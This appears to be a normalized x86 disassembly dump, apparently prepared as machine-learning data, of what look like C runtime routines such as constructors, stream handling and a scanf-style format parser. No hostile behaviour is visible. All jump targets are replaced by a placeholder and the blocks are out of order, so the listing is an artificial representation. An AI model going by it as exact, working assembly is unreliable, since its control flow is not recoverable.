je r-xdata
sub_1000fe50
push ebp
mov ebp esp
sub esp 0x8
push ebx
push edi
xor edi edi
push edi
xor eax eax
mov ecx esi
mov [ esi + 0x30 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x201
mov [ esi + 0x18 ] 0x6
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call sub_1001bdc0
push 0x4
call sub_1001f84c
mov ebx eax
add esp 0x4
cmp ebx edi
je r-xdata
mov [ esi + 0x30 ] edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1006a233
mov [ ebx ] eax
call sub_1001706d
push edi
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_10034e98
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x8 ]
call sub_10069747
mov [ esi + 0x30 ] ebx
pop edi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ecx + 0x4 ] eax
sub_1000fedb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_1000ff00
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10034e98
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi edi
call sub_10069747
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
cmp eax 0xffffffff
jae r-xdata
dec eax
mov [ edi + 0x4 ] eax
sub_1000ff73
push 0xc
push r--data
call sub_1007fb20
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_10027a63
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_10027a63
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1002f519
push ebx
push esi
call sub_10027a63
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10027a63
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10027a63
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_10027a63
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_10027a63
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_10027a63
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_1007ec90
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_10027a63
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_10009cdd
pop ecx
pop ecx
push eax
push esi
call sub_1007ec90
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_1007fb65
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_10009cdd
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_100100f2
push 0xc
push r--data
call sub_1007fb20
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
jmp r-xdata
push esi
call sub_10028fbd
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_1006a055
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001015e
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_1007fb65
retn
mov eax [ ebp - 0x1c ]
sub_10010170
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
add ecx 0x8
push ecx
mov ecx [ ebp + 0xc ]
push eax
push ecx
push edx
call sub_10037a1d
add esp 0x10
pop ebp
retn 0xc
sub_1001018f
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_1003c746
dec [ ebp + 0x1c ]
add esi 0x2
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_100101d0
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_100101f0
push 0x28
mov eax sub_1008558c
call sub_100624bc
and [ ebp - 0x10 ] 0x0
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
push 0x5
pop eax
call sub_10013ab8
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x1c
call sub_1001f84c
pop ecx
mov [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] eax
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
mov ecx [ ebp + 0x8 ]
push 0x0
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1005bb1c
jmp r-xdata
sub_10010280
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
cmp [ eax + 0x1 ] 0x2f
push edi
lea edi [ eax + 0x1 ]
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
mov eax [ esi + 0x4 ]
add eax edi
mov [ esi ] edi
cmp edi eax
je r-xdata
add eax 0x2
add [ esi + 0x4 ] 0xfffffffd
pop edi
mov [ esi ] eax
pop esi
pop ebp
retn
pop edi
movsx eax [ edi ]
push eax
call sub_1005af1f
add esp 0x4
test eax eax
jne r-xdata
sub edi [ esi ]
mov [ esi + 0x4 ] edi
cmp [ edi ] 0x2f
je r-xdata
mov ecx [ esi ]
add ecx [ esi + 0x4 ]
inc edi
cmp edi ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_100102f0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
push edi
call sub_1004dec0
push edi
call sub_100428b0
push edi
call sub_100194e0
mov esi [ ebp + 0x18 ]
add esp 0xc
mov [ esi ] 0xffffffff
mov [ esi + 0x4 ] 0xffffffff
push edi
cmp eax [ ebp + 0x10 ]
jne r-xdata
call sub_100194e0
inc eax
add esp 0x4
cmp eax 0x3d
ja r-xdata
call sub_10042e70
add esp 0x4
pop edi
mov [ esi ] 0xffffffff
mov eax 0x1
pop esi
pop ebp
retn
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
push edx
push eax
call sub_1007ebb0
add esp 0xc
pop edi
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_100103a0 ]
jmp [ eax * 4 + jump_table_10010394 ]
push edi
call sub_10042e70
add esp 0x4
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push ecx
mov ebx edi
call sub_1007e890
add esp 0x8
pop ebx
pop edi
pop esi
pop ebp
retn
sub_100103de
push 0xe0
mov eax sub_10085bd2
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xa4 ] eax
movzx eax [ ebp + 0x1c ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x94 ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x14 ] bl
je r-xdata
lea eax [ ebp - 0xac ]
push eax
call sub_10013950
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10030f91
pop ecx
mov edi eax
mov [ ebp - 0x88 ] eax
lea ecx [ ebp - 0xac ]
lea eax [ ebp - 0xa8 ]
push eax
call sub_10013950
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1004166b
mov edi eax
pop ecx
mov [ ebp - 0x88 ] edi
lea ecx [ ebp - 0xa8 ]
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
sub eax [ ebp + 0x34 ]
push esi
inc eax
push eax
push ebx
lea ecx [ ebp + 0x24 ]
call sub_1003dcac
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
call sub_10034a80
add esi 0x8
push esi
push ebx
push 0x30
call sub_1004a330
movzx esi ax
add esp 0xc
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
mov [ ebp - 0x98 ] esi
call sub_1000ff3d
mov eax [ edi ]
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x8c ] eax
cmp [ ebp + 0x34 ] eax
ja r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
and [ ebp - 0x1c ] 0x0
push 0x7
pop edi
xor eax eax
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] ax
cmp [ ebp + 0x20 ] 0x0
mov esi [ ebp - 0x88 ]
mov eax [ esi ]
lea ecx [ ebp - 0x84 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx esi
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx esi
call sub_10055b84
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx esi
call sub_10055017
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
mov edi [ ebp - 0x8c ]
xor bl bl
xor edx edx
xor ecx ecx
mov ecx [ ebp - 0x88 ]
lea eax [ ebp - 0x80 ]
push eax
call sub_1006e90e
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_10027f5a
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x7
call sub_1003c519
push eax
lea ecx [ ebp - 0x2c ]
call sub_10027f5a
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
call sub_1003c519
and [ ebp - 0x54 ] 0x0
xor eax eax
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] ax
mov eax [ ebp - 0x90 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp [ ebp - 0x34 ] 0x10
mov edi [ ebp - 0x48 ]
movzx ebx ax
jae r-xdata
inc edx
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x34 ]
sub esi [ ebp - 0x8c ]
jmp r-xdata
lea edi [ ebp - 0x48 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov bl 0x1
add edx [ ebp - 0x54 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x84 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x90 ]
cmp [ ecx + 0x24 ] 0x0
mov eax [ ecx + 0x20 ]
jl r-xdata
add edx [ ebp - 0x1c ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor esi esi
jg r-xdata
cmp [ ebp + 0x34 ] edi
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
xor ebx ebx
cmp eax 0x100
jne r-xdata
cmp eax edx
jbe r-xdata
test eax eax
je r-xdata
xor eax eax
mov eax edi
sub eax [ ebp + 0x34 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push ebx
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_1003dcac
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
push [ ebp - 0x94 ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x9c ] eax
call sub_1003c746
mov eax [ ebp - 0xa0 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp - 0x94 ]
lea eax [ ebp - 0xa0 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004b7db
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
test bl bl
jne r-xdata
sub eax edx
mov esi eax
jmp r-xdata
xor esi esi
cmp esi edi
sbb esi esi
neg esi
add esi [ ebp + 0x34 ]
add esi eax
add edx esi
jmp r-xdata
mov edi eax
inc ebx
cmp ebx 0x4
jb r-xdata
push esi
push [ ebp - 0x94 ]
lea eax [ ebp - 0xb4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004b7db
add esp 0x14
xor esi esi
cmp [ ebp - 0x50 ] 0x8
mov eax [ ebp - 0x64 ]
jae r-xdata
sub eax 0x7
je r-xdata
mov eax ecx
mov eax [ eax + 0x14 ]
and eax 0x1c0
mov [ ebp - 0x8c ] eax
cmp eax 0x40
je r-xdata
movsx eax [ ebp + ebx - 0x84 ]
sub eax 0x20
je r-xdata
cmp [ ebp - 0x1c ] 0x1
jbe r-xdata
push [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0xe4 ]
jmp r-xdata
lea eax [ ebp - 0x64 ]
cmp [ ebp - 0x1c ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x90 ]
push esi
push [ ebp - 0x94 ]
xor edi edi
push [ ebp + 0x10 ]
mov [ eax + 0x20 ] edi
push [ ebp + 0xc ]
mov [ eax + 0x24 ] edi
push [ ebp - 0xa4 ]
call sub_1004b7db
add esp 0x14
xor esi esi
push edi
inc esi
push esi
lea ecx [ ebp - 0x64 ]
call sub_1003c519
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1003c519
push edi
push esi
lea ecx [ ebp - 0x48 ]
call sub_1002c8c0
push edi
push esi
lea ecx [ ebp + 0x24 ]
call sub_1003c519
mov eax [ ebp - 0xa4 ]
call sub_1004642f
retn 0x38
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
test edi edi
jne r-xdata
dec eax
dec eax
je r-xdata
mov ecx [ ebp - 0x1c ]
add eax 0x2
dec ecx
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xb4 ]
push [ ebp + 0xc ]
push eax
call sub_1006a200
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
push 0x1
push eax
lea eax [ ebp - 0xec ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp + 0x34 ] edi
ja r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
cmp [ ebp - 0x8c ] 0x100
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
push [ ebp - 0x98 ]
lea ecx [ ebp + 0xc ]
call sub_1003c746
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_1003c746
mov eax edi
sub eax [ ebp + 0x34 ]
push eax
push [ ebp - 0x98 ]
lea eax [ ebp - 0xd4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004b7db
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x14
cmp [ ebp + 0x38 ] 0x8
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x24 ]
jae r-xdata
push [ ebp + 0x34 ]
push eax
lea eax [ ebp - 0xbc ]
lea eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx edi
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xcc ]
push [ ebp + 0xc ]
push eax
call sub_1006a200
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x88 ]
mov [ ebp + 0x10 ] eax
mov eax [ ecx ]
add esp 0x14
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_1003c746
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
lea eax [ ebp + 0x24 ]
push [ ebp + 0x34 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xc4 ]
jmp r-xdata
lea ecx [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx edi
lea eax [ eax + ecx * 2 ]
push edi
push eax
lea eax [ ebp - 0xdc ]
jmp r-xdata
lea eax [ ebp + 0x24 ]
push eax
call sub_1006a200
add esp 0x14
jmp r-xdata
sub_10010960
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_1001f84c
xor edx edx
add esp 0x4
cmp eax edx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
call sub_10069ac6
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10024fe9
int3
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
lea ecx [ eax + 0xc ]
mov [ eax + 0x14 ] dx
cmp ecx edx
je r-xdata
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov [ ecx ] edx
mov edx [ edi + 0x4 ]
mov [ ecx + 0x4 ] edx
sub_100109dd
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_1002fb6b
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_10010a30
push ebp
mov ebp esp
mov eax edx
push esi
lea esi [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
push eax
push edx
call sub_10040ba0
pop esi
pop ebp
retn 0x4
sub_10010a60
push ebp
mov ebp esp
push 0xffffffff
push sub_10087a24
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
call sub_100239e0
mov eax [ esi + 0xb4 ]
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0xb4 ] edi
mov [ esi + 0xb8 ] edi
mov [ esi + 0xbc ] edi
cmp [ esi + 0xa8 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
mov ecx [ esi + 0xb8 ]
lea edx [ esi + 0xc0 ]
push edx
push ecx
push eax
call sub_10069cd0
mov edx [ esi + 0xb4 ]
push edx
call sub_100187af
add esp 0x14
xor ecx ecx
mov [ esi + 0xa8 ] 0x7
mov [ esi + 0xa4 ] edi
mov [ esi + 0x94 ] cx
call sub_10054c70
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x94 ]
push eax
call sub_100187af
add esp 0x4
sub_10010b45
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x18 ]
push 0x3
mov [ eax ] ecx
pop eax
pop ebp
retn 0x1c
sub_10010b61
mov edi edi
push ebp
mov ebp esp
sub esp 0x204
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x1e4 ] ecx
lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x1a0 ] eax
mov [ ebp - 0x1b0 ] esi
mov [ ebp - 0x1a8 ] ecx
mov [ ebp - 0x1d8 ] 0x15e
mov [ ebp - 0x1d0 ] edi
mov [ ebp - 0x1f0 ] edi
mov [ ebp - 0x194 ] edi
mov [ ebp - 0x1f4 ] edi
cmp esi edi
jne r-xdata
cmp eax edi
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
push ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10001e8b
leave
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x204 ]
call sub_1001da0a
mov al [ esi ]
mov [ ebp - 0x1a2 ] 0x0
mov [ ebp - 0x18c ] edi
mov [ ebp - 0x1c8 ] edi
test al al
je r-xdata
push eax
call sub_10041a47
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x1f8 ] 0x0
je r-xdata
movzx eax al
push eax
call sub_1005af1f
pop ecx
test eax eax
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0x1c8 ]
mov eax [ ebp - 0x1fc ]
and [ eax + 0x70 ] 0xfffffffd
mov esi [ ebp - 0x1b0 ]
mov al [ esi ]
cmp al 0x25
jne r-xdata
push [ ebp - 0x1a0 ]
dec [ ebp - 0x18c ]
lea esi [ ebp - 0x18c ]
call sub_100816c9
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
mov ebx eax
movzx eax [ esi ]
inc esi
mov [ ebp - 0x194 ] ebx
mov [ ebp - 0x1b0 ] esi
cmp eax ebx
jne r-xdata
cmp [ esi + 0x1 ] al
je r-xdata
mov esi [ ebp - 0x1b0 ]
push [ ebp - 0x1a0 ]
push eax
call sub_1002435e
pop ecx
pop ecx
pop ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp ebx 0xffffffff
movzx eax bl
push eax
call sub_10012f18
pop ecx
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
xor edi edi
mov [ ebp - 0x1c4 ] edi
mov [ ebp - 0x1d1 ] 0x0
mov [ ebp - 0x1ac ] edi
mov [ ebp - 0x1c0 ] edi
mov [ ebp - 0x19c ] edi
mov [ ebp - 0x1cc ] edi
mov [ ebp - 0x1a3 ] 0x0
mov [ ebp - 0x1a4 ] 0x0
mov [ ebp - 0x196 ] 0x0
mov [ ebp - 0x18d ] 0x0
mov [ ebp - 0x1a1 ] 0x0
mov [ ebp - 0x195 ] 0x0
mov [ ebp - 0x185 ] 0x1
mov [ ebp - 0x1dc ] edi
inc esi
movzx eax [ esi ]
push eax
call sub_1005af1f
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x1d0 ] 0x1
jne r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_1002435e
pop ecx
pop ecx
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
movzx ecx [ esi ]
inc esi
mov [ ebp - 0x1b0 ] esi
cmp ecx eax
jne r-xdata
cmp [ esi + 0x1 ] al
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0x19c ]
inc [ ebp - 0x1c0 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x19c ] eax
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
push [ ebp - 0x1a8 ]
call sub_10035d06
pop ecx
cmp [ esi ] 0x25
jne r-xdata
cmp eax 0xffffffff
je r-xdata
dec [ ebp - 0x18c ]
inc esi
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x18d ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1f4 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1c8 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1b0 ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
push [ ebp - 0x1a0 ]
push eax
call sub_1002435e
pop ecx
pop ecx
dec [ ebp - 0x185 ]
dec [ ebp - 0x195 ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc esi
movzx ebx [ esi ]
movzx eax bl
push eax
call sub_1000a76c
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x196 ] 0x0
mov [ ebp - 0x1b0 ] esi
jne r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x1f8 ] 0x0
je r-xdata
cmp [ ebp - 0x1a2 ] al
jne r-xdata
mov esi eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x196 ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x1e4 ]
mov ebx [ eax ]
mov [ ebp - 0x1ec ] eax
add eax 0x4
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x1fc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
inc [ ebp - 0x1dc ]
mov esi eax
mov [ ebp - 0x1b8 ] edi
mov [ ebp - 0x1b4 ] edi
jmp r-xdata
inc [ ebp - 0x185 ]
inc [ ebp - 0x195 ]
jmp r-xdata
inc [ ebp - 0x18d ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
